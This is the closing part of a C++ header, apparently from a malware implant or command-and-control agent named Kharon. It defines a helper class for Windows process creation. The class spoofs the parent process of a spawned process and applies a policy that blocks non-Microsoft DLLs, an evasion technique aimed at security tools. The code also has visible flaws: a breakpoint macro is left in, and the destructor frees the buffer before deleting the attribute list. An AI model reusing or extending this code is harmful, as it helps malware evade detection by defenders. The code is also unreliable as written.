    DECLFN ProcThreadAttrList() : AttrBuff( 0 ), AttrSize( 0 ) {}

    __forceinline auto DECLFN Initialize(
        _In_ UINT8 UpdateCount
    ) -> BOOL {
        INT3BRK
        Krnl32.InitializeProcThreadAttributeList( 0, UpdateCount, 0, &AttrSize );
        AttrBuff = (LPPROC_THREAD_ATTRIBUTE_LIST)Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, AttrSize );

        return Krnl32.InitializeProcThreadAttributeList( AttrBuff, UpdateCount, 0, &AttrSize );
    }

    auto DECLFN UpdateParentSpf(
        _In_ HANDLE ParentHandle
    ) -> BOOL {
        return Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentHandle, sizeof( HANDLE ), 0, 0 );
    }

    auto DECLFN UpdateBlockDlls(
        VOID
    ) -> BOOL {
        UINT64 Policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        return Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( Policy ), 0, 0 );
    }

    inline DECLFN ~ProcThreadAttrList(
        VOID
    ) {
        if ( AttrBuff ) {
            Mem::Zero( U_PTR( AttrBuff ), AttrSize );
            Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, C_PTR( AttrBuff ) );
            Krnl32.DeleteProcThreadAttributeList( AttrBuff );
        }
    }

    DECLFN LPPROC_THREAD_ATTRIBUTE_LIST GetAttrBuff() const { return AttrBuff; }
};

EXTERN_C void* __cdecl memset(void*, int, size_t);
EXTERN_C VOID volatile ___chkstk_ms( VOID );

#endif // KHARON_H